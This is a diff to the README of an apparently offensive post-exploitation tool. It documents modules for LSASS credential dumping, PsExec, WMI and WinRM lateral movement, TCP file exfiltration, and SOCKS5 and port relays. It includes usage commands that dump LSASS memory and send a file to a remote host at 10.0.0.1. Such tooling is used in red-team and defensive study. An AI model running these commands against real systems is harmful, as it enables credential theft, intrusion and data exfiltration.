@@ -178,9 +178,9 @@ Configurable fail action: report only, or terminate on detection.
 
 Usage: `badang-cli loader --check all -x -c`
 
-## Post-Exploitation (Credentials + Lateral Movement)
+## Post-Exploitation
 
-Credential harvesting and lateral movement modules, loaded on demand.
+Credential harvesting, lateral movement, data exfiltration, and network tunneling modules.
 
 | Module | Technique | Description |
 |--------|-----------|-------------|
@@ -190,10 +190,15 @@ Credential harvesting and lateral movement modules, loaded on demand.
 | Remote Service | PsExec pattern | WNetAddConnection2A → CopyFileA → CreateServiceA → StartServiceA → cleanup |
 | Remote Execution (WMI) | wmic process call create | Execute command on remote host via WMI |
 | Remote Execution (WinRM) | winrs | Execute command on remote host via WinRM |
+| Staged Transfer | Socket exfil | CreateFileA → read 64KB chunks → optional RC4 encrypt → send via TCP socket |
+| Proxy Relay | SOCKS5 proxy | WSAStartup → bind → listen → accept → SOCKS5 handshake → bidirectional relay |
+| Port Relay | Port forward | WSAStartup → bind → listen → accept → connect remote → bidirectional relay |
 
-Comms protocol extended with task types 4–7 (FileUpload, FileDownload, CredDump, LateralMove).
+Comms protocol extended with task types 4–10 (FileUpload, FileDownload, CredDump, LateralMove, Exfil, SocksConnect, PortForward).
 
 Usage: `badang-cli postex --module lsass --pid 672 --postex-output dump.bin -x -c`
+Usage: `badang-cli postex --module exfil --file data.zip --remote-host 10.0.0.1 --remote-port 8443 -x -c`
+Usage: `badang-cli postex --module socks --listen-port 1080 -x -c`
 
 ## PE Helpers
 
